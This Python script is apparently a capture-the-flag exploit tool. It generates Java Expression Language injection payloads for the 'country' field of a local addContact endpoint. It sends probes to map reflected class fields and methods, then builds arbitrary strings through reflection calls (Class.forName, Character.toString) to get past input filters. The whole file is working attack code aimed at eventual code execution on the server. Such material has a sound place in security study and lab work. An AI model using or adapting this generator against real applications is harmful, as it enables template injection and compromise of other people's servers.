import requests
import string
import json
from collections import OrderedDict
from utils import Utils

utils = Utils('http://localhost:1337/addContact', 'POST', 'country', '{}', '', True)

class GenPayload:
    
    def __init__(self) -> None:
        self.WORDLIST = ['java', '.', '(', ')']
        self.STARTING_SUBSTRING_TABLE = {}
        self.ARRAY_CLASS = '[].getClass()'
        self.CLASS_CLASS = self.ARRAY_CLASS + '.getClass()'
        self.FORNAME_METHOD_INDEX = 2
        self.ASC_toStringMethod_INDEX = 5
        self.LETTERS = string.ascii_letters
        self.SUBSTRING_TABLE = OrderedDict()
    
    def genNumArraySize(self, num):
        """
        Generate payload for getting number using array size
        
        :param num: Number
        """
        null_list = ','.join(['[]'] * num)
        result = f"[{null_list}].size()"
        return result
    
    
    def genNumHashCode(self, num):
        """
        Generate payload for getting number using hash code
        
        :param num: Number
        """
        def genNumber(num):
            if num == 0:
                return "[].hashCode() mod [].hashCode()"
            if num == 1:
                return "[].hashCode() div [].hashCode()"

            return genStringInt("p" * num) + ".length()"
        
        def genStringInt(str):
            v = "[].getClass().getPackage().toString()"
            if len(str) == 1:
                return f"{v}.substring({genNumber(0)}, {genNumber(1)})"
            return f"{v}.substring({genNumber(0)}, {genNumber(1)}).concat({genStringInt(str[1:])})"
        
        return genNumber(num)
    
    def genNumString(self, num):
        """
        Generate payload for getting number using string
        
        :param num: Number
        """
        return "s" * num + ".length()"
    
    
    def genEL(self, content):
        """
        Generate EL payload
        
        :param content: Content
        """
        
        return '${' + content + '}'
    
    def getMethodIndexFromClass(self, classStr, index):
        return f'{classStr}.getMethods()[{self.genNumArraySize(index)}]'
    
    def getDeclaredField(self, classStr, index):
        indexNum = self.genNumArraySize(index)
        return f'{classStr}.getDeclaredFields()[{indexNum}]'
    
    def enrichSubstringTable(self, source, sourceIndex, str):
        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                continue

            index = str.find(word)
            if index >= 0:
                self.STARTING_SUBSTRING_TABLE[word] = [source, sourceIndex, index, index+len(word)]
                
    def genSubstringTable(self):
        """
        Generate substring table 
        
        Example: 'java': ['stringFields', 0, 0, 4] means that the word 'java' can be replace
        with the substring of the first field of the array class from index 0 to 4
        """
        # String fields
        for i in range(10):
            payload = f'{self.genEL(self.getDeclaredField(self.ARRAY_CLASS, i))}'
            result = utils.getDataFromResponse(utils.sendPayload(payload))
            self.enrichSubstringTable('stringFields', i, result)

        # String methods
        for i in range(80):
            payload = f'{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}'
            result = utils.getDataFromResponse(utils.sendPayload(payload))
            self.enrichSubstringTable('stringMethods', i, result)
            
    def genSubstring(self, object, indexStart, indexEnd):
        return f'{object}.toString().substring({self.genNumArraySize(indexStart)}, {self.genNumArraySize(indexEnd)})' 
    
    def genWord(self, word):
        if word not in self.WORDLIST:
            return "null"
        
        source, sourceIndex, indexStart, indexEnd = self.SUBSTRING_TABLE[word]

        if source == 'stringFields':
            object = self.getDeclaredField(self.ARRAY_CLASS, sourceIndex)
        else:
            object = self.getMethodIndexFromClass(self.ARRAY_CLASS, sourceIndex)

        return self.genSubstring(object, indexStart, indexEnd)
    
    def genConcatStr(self, left, middle, right):

        currentStr = ''
        if left != '':
            currentStr = left

        if currentStr != '':
            currentStr += f'.concat({middle})'
        else:
            currentStr = middle

        if right != '':
            currentStr += f'.concat({right})'

        return currentStr
    def genClassForname(self, className):
        forname = self.getMethodIndexFromClass(self.CLASS_CLASS, self.FORNAME_METHOD_INDEX)
        class_str = self.genString(className)
        return f'{forname}.invoke(null, {class_str})'

    def genASCToString(self, asc):
        characterClass = self.genClassForname('java.lang.Character')
        toStringMethod = self.getMethodIndexFromClass(characterClass, self.ASC_toStringMethod_INDEX)
        ascNumber = self.genNumArraySize(asc)

        return f'{toStringMethod}.invoke(null, {ascNumber})'

    def genString(self, str, wordIndex=0):
        if wordIndex >= len(self.WORDLIST):
            currentStr = ''

            for ch in str:
                ch_str = self.genASCToString(ord(ch))
                if currentStr != '':
                    currentStr = f'{currentStr}.concat({ch_str})'
                else:
                    currentStr += ch_str

            return currentStr
        
        if len(str) == 0:
            return ''

        # find words
        word = self.WORDLIST[wordIndex]

        if str == word:
            return self.genWord(word)

        index = str.find(word)
        if index >= 0:

            if index > 0:
                left = self.genString(str[:index])
            else:
                # avoid -1 getting more data
                left = ''

            right = self.genString(str[index+len(word):])
            processed_word = self.genWord(word)
            return self.genConcatStr(left, processed_word, right)
        else:
            return self.genString(str, wordIndex + 1)
        
        
    def initialize(self):

        for l in self.LETTERS:
            self.WORDLIST.append(l)

        self.genSubstringTable()

        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                self.SUBSTRING_TABLE[word] = self.STARTING_SUBSTRING_TABLE[word]
                
genPayload = GenPayload()
genPayload.initialize()
print(genPayload.genString('shiba'))